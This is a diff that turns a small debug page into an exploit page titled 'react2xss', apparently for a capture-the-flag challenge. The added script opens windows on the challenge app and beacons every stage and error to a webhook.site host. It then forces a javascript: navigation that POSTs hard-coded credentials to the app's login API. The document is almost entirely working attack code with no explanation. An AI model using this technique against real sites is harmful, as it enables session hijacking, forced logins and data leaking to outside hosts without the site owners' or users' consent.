@@ -2,13 +2,58 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>dbg</title>
+  <title>react2xss</title>
 </head>
 <body>
+loading...
 <script>
+const APP = 'http://chal.polyuctf.com:46605';
 const HOOK = 'https://webhook.site/b3200547-ba91-46b8-acc1-ec4381a2fcb3';
-new Image().src = HOOK + '/?stage=gh_loaded&ts=' + Date.now();
+const USER = 'admin123';
+const PASS = 'admin12345';
+
+const ping = (q) => {
+  new Image().src = HOOK + '/?' + q + '&ts=' + Date.now();
+};
+
+ping('stage=gh_loaded');
+
+let victim = null;
+let switcher = null;
+
+try {
+  victim = window.open(APP + '/api/profile', 'victim');
+  ping('stage=victim_opened');
+} catch (e) {
+  ping('stage=victim_open_err&d=' + encodeURIComponent(String(e)));
+}
+
+try {
+  switcher = window.open(APP + '/login', 'switcher');
+  ping('stage=switcher_opened');
+} catch (e) {
+  ping('stage=switcher_open_err&d=' + encodeURIComponent(String(e)));
+}
+
+setTimeout(() => {
+  try {
+    const body = JSON.stringify({ username: USER, password: PASS });
+
+    const js = "javascript:(async()=>{try{" +
+      "await fetch('/api/auth/login',{" +
+        "method:'POST'," +
+        "headers:{'Content-Type':'application/json'}," +
+        "body:" + JSON.stringify(body) +
+      "});" +
+      "location='/'" +
+    "}catch(e){document.body.innerText='ERR:'+e}})()";
+
+    switcher.location = js;
+    ping('stage=jsnav_sent');
+  } catch (e) {
+    ping('stage=jsnav_err&d=' + encodeURIComponent(String(e)));
+  }
+}, 1500);
 </script>
-ok
 </body>
 </html>
